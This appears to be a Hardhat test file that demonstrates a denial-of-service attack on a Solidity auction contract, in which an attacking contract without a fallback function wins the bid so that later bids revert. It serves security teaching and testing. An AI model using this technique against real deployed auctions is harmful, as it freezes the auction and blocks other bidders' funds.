import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.connect();
/**“There are two steps:

The first bidder does not implement a fallback function.

When the second bidder places a bid, the contract tries to send funds back to the first bidder via the fallback,
but since it doesn’t exist, the transaction fails and the contract becomes blocked.”
**/
describe("Dos", function () {
  it("Should block the contract.", async function () {
    const signers = await ethers.getSigners();
    const auction = await ethers.deployContract("Auction");
    const attack = await ethers.deployContract("AttackDos", [auction.target]);

    console.log("Auction deployed to:", auction.target);
    console.log("attack deployed to:", attack.target);
    console.log("Auction highestBidder:", await auction.highestBidder());
    console.log("Auction highestBid:", await auction.highestBid());

    await auction.connect(signers[1]).bid({ value: ethers.parseEther("1") });
    console.log("First bid");
    console.log("Auction highestBidder:", await auction.highestBidder());
    console.log("Auction highestBid:", await auction.highestBid());
    expect(await auction.highestBidder()).to.equal(signers[1].address);

    await attack.attack({ value: ethers.parseEther("2") });
    console.log("Attack bid");
    console.log("Auction highestBidder:", await auction.highestBidder());
    console.log("Auction highestBid:", await auction.highestBid());
    expect(await auction.highestBidder()).to.equal(attack.target);

//Bid is blocked now
    await expect(auction.connect(signers[3]).bid({ value: ethers.parseEther("3") })).to.revert(ethers);
    console.log("Auction highestBidder:", await auction.highestBidder());
    console.log("Auction highestBid:", await auction.highestBid());
    expect(await auction.highestBidder()).to.equal(attack.target);

  });

});
